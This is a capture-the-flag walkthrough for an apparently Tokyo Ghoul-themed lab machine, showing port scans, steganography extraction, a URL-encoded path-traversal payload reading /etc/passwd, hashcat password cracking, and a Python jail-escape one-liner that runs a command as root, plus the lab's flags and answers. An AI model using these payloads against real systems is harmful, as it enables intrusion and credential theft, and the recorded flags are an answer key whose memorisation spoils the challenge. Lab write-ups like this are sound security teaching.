# Tokyo Ghoul - Medium

1. [Where am I?](#where-am-i)
2. [Planning to escape](#planning-to-escape)
3. [What Rize is trying to say?](#what-rize-is-trying-to-say)
4. [Fight Jason](#fight-jason)

## Where am I?

```shell
rustscan -a 10.10.4.216 --range 0-65535 --ulimit 5000 -- -sV
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 22 - ssh - OpenSSH 7.2p2
  * 80 - http - Apache httpd 2.4.18 (Ubuntu)
```

1. How many ports are open? - 3

2. What is the OS used? - Ubuntu

## Planning to escape

```shell
feroxbuster -u http://10.10.4.216 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf --extract-links --scan-limit 2 --filter-status 401,403,404,405,500

ftp 10.10.4.216
#anonymous login
#get all 3 files
#go through them

cat Aogiri_tree.txt
#no clue

steghide info rize_and_kaneki.jpg
#this contains a file
#but we do not have the passphrase

file need_to_talk
#executable

chmod +x need_to_talk

./need_to_talk
#this asks for a passphrase
#we do not have it

#using given clue
rabin2 -z need_to_talk

./need_to_talk
#use the password we found
#gives us another string

steghide extract -sf rize_and_kaneki.jpg
#the string can be used as passphrase
#we extract a .txt file
```

```markdown
We can use Feroxbuster or Gobuster or any tool to enumerate the web directories; I'm using Feroxbuster as it is recursive.

We can also login to ftp as anonymous and get all the three files.

While exploring the website, we get a clue in the source code of the page - it informs us about the ftp anonymous login.

There is only one web directory enumerated - /css, and it does not contain anything useful.

The main page leads us to /jasonroom.html, which also leads us to the ftp clue.

Going back to the three files we got from ftp, we can check them one-by-one for clues.

The text file does not contain any clue; for the .jpg file, we can check using stego tools.

steghide does show there is a file inside it, but we do not have the passphrase.

Executing the 'need_to_talk' file, we are prompted for a passphrase, but we do not have it; however, it gives a clue for 'rabin2 -z'

Googling about rabin2 shows that it is a RE tool; and rabin2 -z is for Strings inside binary.

Using rabin2, we get the password 'kamishiro'.

Executing the binary and using this password as input, we get another string "You_found_1t".

Using this string as passphrase for the hidden file in the .jpg file with steghide helps us extract a text file
```

1. Did you find the note that the others ghouls gave you? Where did you find it? - jasonroom.html

2. What is the key for Rize executable? - kamishiro

## What Rize is trying to say?

```shell
cat yougotme.txt
#the text file contains morse code

feroxbuster -u http://10.10.4.216/d1r3c70ry_center -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf --extract-links --scan-limit 2 --filter-status 401,403,404,405,500

feroxbuster -u http://10.10.4.216/d1r3c70ry_center/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent
#using different wordlist

#crack hash
hashcat -a 0 -m 1800 kamishiro.txt /usr/share/wordlists/rockyou.txt
```

```markdown
The extracted text file contains Morse code; we can use CyberChef for this.

Converting from Morse code we get hex characters; and converting from hex characters we get base64 - this translates to d1r3c70ry_center, the hidden directory.

We do not get any significant clue on visiting this directory, so we can scan it for any hidden directories.

Using feroxbuster, the /claim directory is found, which leads to a page; we have two options 'YES' and 'NO'.

Both these options leads us to the same .gif file, so maybe that is the clue.

We can check for any clues in the .gif file, using stego techniques, but we do not get anything.

We can try directory scanning one more time, this time using a different wordlist; but we do not get anything significant.

Using the clues, we are told to 'moonwalk'; this refers to using '/..' in the web directory.

When we implement this in our webpage, we navigate to /d1r3c70ry_center/claim/index.php?view=flower.gif/..

This contains a message:

  no no no silly don't do that

This means we are going on the right path; using this maybe we can attempt for LFI (local file inclusion) vulnerability.

We can encode the characters using URL encode on CyberChef.

Using the usual payloads, we eventually get lucky by using '../../../etc/passwd' URL-encoded; final payload used is '%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd'

By visiting the directory /d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd, we get the username and hash for 'kamishiro'

This hash is of type 'sha512 crypt $6$'; we can crack it using Hashcat.

After cracking we get the creds kamishiro:password123; we can log into SSH now.
```

1. What the message mean did you understand it? What it says? - d1r3c70ry_center

2. What is Rize username? - kamishiro

3. What is Rize password? - password123

## Fight Jason

```shell
ssh kamishiro@10.10.4.216

ls -la

cat user.txt

cat jail.py

sudo -l

sudo /usr/bin/python3 /home/kamishiro/jail.py
```

```markdown
After logging into SSH, we can read the user flag in kamishiro's home directory.

There is a Python program as well which allows us to enter a command as input, and it executes it.

There is, however, a blacklist of keywords - commands such as eval and exec - due to which we cannot give those keywords as input for the Python program.

This program is by root, and further, using 'sudo -l', we can see that this program can be run as root by our user.

We just need to find a way to execute a command which helps us in privesc.

Since we cannot use ordinary commands for execution, we can use built-in functions to avoid this; we can get hints by searching for Python Jailbreak problems on Google.

I used this blog post as reference - <https://anee.me/escaping-python-jails-849c65cf306e>

Using the following input with the help of built-in functions, we can get root flag:

  __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```

1. user.txt - e6215e25c0783eb4279693d9f073594a

2. root.txt - 9d790bb87898ca66f724ab05a9e6000b
